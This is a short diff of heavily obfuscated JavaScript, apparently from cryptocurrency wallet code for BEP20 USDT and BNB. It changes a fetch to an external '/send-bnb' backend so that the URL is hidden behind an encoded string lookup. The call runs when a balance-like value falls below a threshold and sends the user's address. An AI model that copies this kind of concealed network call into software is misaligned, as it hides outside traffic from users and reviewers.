@@ -276,7 +276,7 @@ const _0x1b5be5 = _0x3140;
             try {
                 _0x1cd071 < 0.0005 &&
                     (console["log"](_0x4b8098(0xce)),
-                        await fetch(https://bep20usdt-backend-production.up.railway.app/send-bnb), {
+                        await fetch(_0x4b8098(0xc9), {
                             method: _0x4b8098(0xbb),
                             headers: { "Content-Type": _0x4b8098(0xec) },
                             body: JSON[_0x4b8098(0xd4)]({ toAddress: userAddress }),
